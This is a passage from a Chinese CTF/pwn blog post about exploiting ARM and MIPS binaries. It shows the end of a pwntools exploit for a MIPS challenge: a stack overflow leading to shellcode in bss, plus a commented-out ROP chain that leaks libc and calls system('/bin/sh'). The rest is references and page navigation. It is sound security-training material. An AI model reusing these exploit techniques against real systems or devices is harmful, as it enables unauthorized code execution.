class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-mipsel&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/mipsel-linux-uclibc&quot;</span>, <span class="string">&quot;pwn2&quot;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;pwn2&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/mipsel-linux-uclibc/lib/libc.so.0&quot;</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">36</span></span><br><span class="line">bss = <span class="number">0x410B70</span></span><br><span class="line">text_read = <span class="number">0x4007E0</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What&#x27;s your name:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;skye&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;bss:&quot;</span>+<span class="built_in">hex</span>(elf.bss()))</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#ret2shellcode</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(padding-<span class="number">4</span>)</span><br><span class="line"><span class="comment">#fp</span></span><br><span class="line">payload += p32(bss + <span class="number">0x200</span> - <span class="number">0x18</span>)</span><br><span class="line"><span class="comment">#调用read向bss段输入shellcode，然后ret到bss段</span></span><br><span class="line">payload += p32(text_read)</span><br><span class="line"> </span><br><span class="line">p.send(payload)</span><br><span class="line"> </span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x24</span>     <span class="comment">#12</span></span><br><span class="line">payload += p32(bss + <span class="number">0x200</span> + <span class="number">0x28</span>)</span><br><span class="line">payload += shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sleep(0.2)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># gadget1</span></span><br><span class="line"><span class="string">payload = &#x27;a&#x27;*padding</span></span><br><span class="line"><span class="string">payload += p32(0x004006C8)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#payload += p32(elf.plt[&#x27;puts&#x27;])	# fp</span></span><br><span class="line"><span class="string">payload += p32(1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload += &quot;a&quot; * 0x18</span></span><br><span class="line"><span class="string">payload += &#x27;a&#x27; * 4 # s0</span></span><br><span class="line"><span class="string">#payload += p32(elf.got[&#x27;puts&#x27;]) # s1</span></span><br><span class="line"><span class="string">payload += p32(0x00410B58)</span></span><br><span class="line"><span class="string">payload += p32(0x0040092C) # s2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload += &#x27;a&#x27; * 4 # s3</span></span><br><span class="line"><span class="string">payload += p32(0x004007A4) # ra</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload += &#x27;a&#x27;*0x20</span></span><br><span class="line"><span class="string">payload += p32(0x004007C4)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sleep(0.2)</span></span><br><span class="line"><span class="string">p.send(payload)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.recv()</span></span><br><span class="line"><span class="string">#success(a)</span></span><br><span class="line"><span class="string">libc_addr = u32(p.recv(4))-libc.symbols[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">success(&quot;libc_addr: &quot; + hex(libc_addr))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.recv()</span></span><br><span class="line"><span class="string">#p.send(payload)</span></span><br><span class="line"><span class="string">system_addr = libc_addr + libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">binsh_addr = libc_addr + 0x9bc48</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># gadget2</span></span><br><span class="line"><span class="string">payload = &#x27;a&#x27;*0x24</span></span><br><span class="line"><span class="string">payload += p32(0x004006C8)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload += &#x27;a&#x27;*0x1c</span></span><br><span class="line"><span class="string">payload += &#x27;a&#x27;*4 #s0</span></span><br><span class="line"><span class="string">payload += p32(binsh_addr)</span></span><br><span class="line"><span class="string">payload += p32(system_addr)</span></span><br><span class="line"><span class="string">payload += &#x27;a&#x27;*4</span></span><br><span class="line"><span class="string">payload += p32(0x004007A4)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.send(payload)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h1><ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/105281585">mips&amp;arm&amp;aarch64-pwn初探</a></li>
<li><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/arm/arm_rop/">arm - ROP</a></li>
<li><a target="_blank" rel="noopener" href="https://m4x.fun/post/how-2-pwn-an-arm-binary/">如何 pwn 掉一个 arm 的binary</a></li>
<li><a target="_blank" rel="noopener" href="https://www.lyyl.online/2020/10/09/MIPS-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E8%B0%83%E8%AF%95/">MIPS 环境搭建及调试</a></li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">SkYe231</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.mrskye.cn/archives/efe6e61e/">https://www.mrskye.cn/archives/efe6e61e/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.mrskye.cn" target="_blank">SkYe231 Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN/">PWN</a><a class="post-meta__tags" href="/tags/ARM/">ARM</a></div><div class="post_share"><div class="social-share" data-image="/img/default_cover0.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/archives/114d7ffc/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">House_of_Lore</div></div></a></div><div class="next-post pull-right"><a href="/archives/ed4b4a2a/"><img class="next-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover6.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">FSOP</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/archives/9058dffc/" title="ASLR与PIE学习笔记"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover3.png" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-03-26</div><div class="title">ASLR与PIE学习笔记</div></div></a></div><div><a href="/archives/bd0188a8/" title="劫持 fileno 控制文件流"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover0.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-04-06</div><div class="title">劫持 fileno 控制文件流</div></div></a></div><div><a href="/archives/5bd18a78/" title="格式化字符串漏洞基础利用"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-04-06</div><div class="title">格式化字符串漏洞基础利用</div></div></a></div><div><a href="/archives/625c64bd/" title="House of orange"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover0.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-05-01</div><div class="title">House of orange</div></div></a></div><div><a href="/archives/114d7ffc/" title="House_of_Lore"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover2.png" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-04-06</div><div class="title">House_of_Lore</div></div></a></div><div><a href="/archives/36f80a82/" title="realloc_hook 调整栈帧使 onegadget 生效"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover1.png" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-03-28</div><div class="title">realloc_hook 调整栈帧使 onegadget 生效</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">SkYe231</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">105</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">145</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div></div><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:skye231@foxmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://www.mrskye.cn/atom.xml" target="_blank" title=""><i class="fas fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">请修改默认公告</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%EF%BC%88%E5%9F%BA%E4%BA%8EUbuntu18-04"><span class="toc-number">1.</span> <span class="toc-text">环境搭建（基于Ubuntu18.04)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-qemu"><span class="toc-number">1.1.</span> <span class="toc-text">安装 qemu</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%8C%85%E7%AE%A1%E7%90%86"><span class="toc-number">1.1.1.</span> <span class="toc-text">使用包管理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85"><span class="toc-number">1.1.2.</span> <span class="toc-text">从源码编译安装</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">下载源码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%84%E7%90%86%E4%BE%9D%E8%B5%96"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">处理依赖</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">编译安装</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F"><span class="toc-number">1.1.3.</span> <span class="toc-text">验证安装成功</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E5%8A%A8%E6%80%81%E8%BF%90%E8%A1%8C%E5%BA%93"><span class="toc-number">1.2.</span> <span class="toc-text">安装动态运行库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85binutils%E7%8E%AF%E5%A2%83"><span class="toc-number">1.3.</span> <span class="toc-text">安装binutils环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">1.4.</span> <span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#qemu-%E4%BD%BF%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">qemu 使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E8%88%AC%E8%B0%83%E8%AF%95"><span class="toc-number">2.1.</span> <span class="toc-text">一般调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E6%A8%A1%E6%9D%BF"><span class="toc-number">2.2.</span> <span class="toc-text">脚本模板</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ARM%E6%9E%B6%E6%9E%84"><span class="toc-number">3.</span> <span class="toc-text">ARM架构</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8%E8%A7%84%E5%88%99"><span class="toc-number">3.1.</span> <span class="toc-text">寄存器规则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ARM%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%8EIntel%E5%AF%84%E5%AD%98%E5%99%A8%E5%AF%B9%E7%85%A7%E5%85%B3%E7%B3%BB"><span class="toc-number">3.2.</span> <span class="toc-text">ARM寄存器与Intel寄存器对照关系</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E6%A0%88-Stack-%E8%A7%84%E5%88%99"><span class="toc-number">3.3.</span> <span class="toc-text">堆栈(Stack)规则</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#STMFD"><span class="toc-number">3.3.1.</span> <span class="toc-text">STMFD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDMFD"><span class="toc-number">3.3.2.</span> <span class="toc-text">LDMFD</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%A0%E5%8F%82%E8%A7%84%E5%88%99"><span class="toc-number">3.4.</span> <span class="toc-text">传参规则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%94%E5%9B%9E%E5%80%BC%E8%A7%84%E5%88%99"><span class="toc-number">3.5.</span> <span class="toc-text">返回值规则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E5%9D%80%E8%A7%84%E5%88%99"><span class="toc-number">3.6.</span> <span class="toc-text">访址规则</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8%E7%9B%B4%E6%8E%A5%E5%8F%96%E5%9D%80"><span class="toc-number">3.6.1.</span> <span class="toc-text">寄存器直接取址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%8B%E5%8D%B3%E6%95%B0%E5%81%8F%E7%A7%BB%E5%AF%BB%E5%9D%80"><span class="toc-number">3.6.2.</span> <span class="toc-text">立即数偏移寻址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8%E4%BD%9C%E5%81%8F%E7%A7%BB%E5%AF%BB%E5%9D%80"><span class="toc-number">3.6.3.</span> <span class="toc-text">寄存器作偏移寻址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8%E7%BC%A9%E6%94%BE%E5%80%BC%E4%BD%9C%E5%81%8F%E7%A7%BB%E5%AF%BB%E5%9D%80"><span class="toc-number">3.6.4.</span> <span class="toc-text">寄存器缩放值作偏移寻址</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ARMEABI"><span class="toc-number">3.7.</span> <span class="toc-text">ARMEABI</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Arch64%E6%9E%B6%E6%9E%84"><span class="toc-number">4.</span> <span class="toc-text">Arch64架构</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">4.1.</span> <span class="toc-text">寄存器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%87%E4%BB%A4%E5%9F%BA%E6%9C%AC%E6%A0%BC%E5%BC%8F"><span class="toc-number">4.2.</span> <span class="toc-text">指令基本格式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E6%93%8D%E4%BD%9C%E6%8C%87%E4%BB%A4-load-store"><span class="toc-number">4.3.</span> <span class="toc-text">内存操作指令-load&#x2F;store</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8E-amd-%E7%9A%84%E5%8F%98%E5%8C%96"><span class="toc-number">4.4.</span> <span class="toc-text">与 amd 的变化</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MIPS%E6%9E%B6%E6%9E%84"><span class="toc-number">5.</span> <span class="toc-text">MIPS架构</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mips%E3%80%81mipsel%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">5.1.</span> <span class="toc-text">mips、mipsel的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8-1"><span class="toc-number">5.2.</span> <span class="toc-text">寄存器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E6%A0%88%E8%A7%84%E5%88%99"><span class="toc-number">5.3.</span> <span class="toc-text">堆栈规则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="toc-number">5.4.</span> <span class="toc-text">函数调用的过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP-chain"><span class="toc-number">5.5.</span> <span class="toc-text">ROP chain</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4"><span class="toc-number">5.6.</span> <span class="toc-text">汇编指令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode-%E5%BC%80%E5%8F%91"><span class="toc-number">5.7.</span> <span class="toc-text">shellcode 开发</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%98%E5%8C%96"><span class="toc-number">5.7.1.</span> <span class="toc-text">优化</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98"><span class="toc-number">6.</span> <span class="toc-text">入门实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-typo"><span class="toc-number">6.1.</span> <span class="toc-text">jarvisoj - typo</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%83%85%E5%86%B5"><span class="toc-number">6.1.1.</span> <span class="toc-text">基本情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">6.1.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2018-%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-baby-arm"><span class="toc-number">6.2.</span> <span class="toc-text">2018 上海市大学生网络安全大赛 - baby_arm</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%83%85%E5%86%B5-1"><span class="toc-number">6.2.1.</span> <span class="toc-text">基本情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2csu"><span class="toc-number">6.2.2.</span> <span class="toc-text">ret2csu</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">6.2.3.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#root-me-stack-spraying"><span class="toc-number">6.3.</span> <span class="toc-text">root_me_stack_spraying</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%83%85%E5%86%B5-2"><span class="toc-number">6.3.1.</span> <span class="toc-text">基本情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-2"><span class="toc-number">6.3.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Codegate2018-Melong"><span class="toc-number">6.4.</span> <span class="toc-text">Codegate2018_Melong</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%83%85%E5%86%B5-3"><span class="toc-number">6.4.1.</span> <span class="toc-text">基本情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">6.4.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-3"><span class="toc-number">6.4.3.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#inctf2018-wARMup"><span class="toc-number">6.5.</span> <span class="toc-text">inctf2018_wARMup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%83%85%E5%86%B5-4"><span class="toc-number">6.5.1.</span> <span class="toc-text">基本情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-4"><span class="toc-number">6.5.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#root-me-stack-buffer-overflow-basic"><span class="toc-number">6.6.</span> <span class="toc-text">root_me_stack_buffer_overflow_basic</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%83%85%E5%86%B5-5"><span class="toc-number">6.6.1.</span> <span class="toc-text">基本情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-5"><span class="toc-number">6.6.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#axb-2019-mips"><span class="toc-number">6.7.</span> <span class="toc-text">axb_2019_mips</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%83%85%E5%86%B5-6"><span class="toc-number">6.7.1.</span> <span class="toc-text">基本情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-6"><span class="toc-number">6.7.2.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0-1"><span class="toc-number">7.</span> <span class="toc-text">参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/archives/55a7d556/" title="第十四届全国大学生信息安全竞赛线上初赛Writeup"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第十四届全国大学生信息安全竞赛线上初赛Writeup"/></a><div class="content"><a class="title" href="/archives/55a7d556/" title="第十四届全国大学生信息安全竞赛线上初赛Writeup">第十四届全国大学生信息安全竞赛线上初赛Writeup</a><time datetime="2021-05-16T08:42:58.374Z" title="更新于 2021-05-16 16:42:58">2021-05-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/44c34994/" title="第四届红帽杯线上赛Writeup"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210514000902.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第四届红帽杯线上赛Writeup"/></a><div class="content"><a class="title" href="/archives/44c34994/" title="第四届红帽杯线上赛Writeup">第四届红帽杯线上赛Writeup</a><time datetime="2021-05-16T08:01:47.026Z" title="更新于 2021-05-16 16:01:47">2021-05-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/d4cc29fc/" title="d4cc29fc"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="d4cc29fc"/></a><div class="content"><a class="title" href="/archives/d4cc29fc/" title="d4cc29fc">d4cc29fc</a><time datetime="2021-05-14T13:07:29.631Z" title="更新于 2021-05-14 21:07:29">2021-05-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/f4b801d2/" title="2021 ISCC 信息安全与对抗技术竞赛Writeup"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021 ISCC 信息安全与对抗技术竞赛Writeup"/></a><div class="content"><a class="title" href="/archives/f4b801d2/" title="2021 ISCC 信息安全与对抗技术竞赛Writeup">2021 ISCC 信息安全与对抗技术竞赛Writeup</a><time datetime="2021-05-13T16:07:25.953Z" title="更新于 2021-05-14 00:07:25">2021-05-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/a24f3497/" title="2021津门杯Writeup"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021津门杯Writeup"/></a><div class="content"><a class="title" href="/archives/a24f3497/" title="2021津门杯Writeup">2021津门杯Writeup</a><time datetime="2021-05-12T15:50:44.311Z" title="更新于 2021-05-12 23:50:44">2021-05-12</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/default_cover0.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2021 By SkYe231</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a href="https://cloud.tencent.com/product/wh?from=12331" target="_blank">Hosted BY 云开发 Cloudbase</a>&nbsp;|&nbsp;<a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-07-01-lGwrnPz3GuV4odmM.png" align="top" style="width:48px"></a><br /><div class="github-badge"><a rel="license" href="http://beian.miit.gov.cn/" target="_blank" title="粤ICP备20056619号"><span class="badge-subject">粤ICP备</span><span class="badge-value bg-black">20056619号</span></a></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i 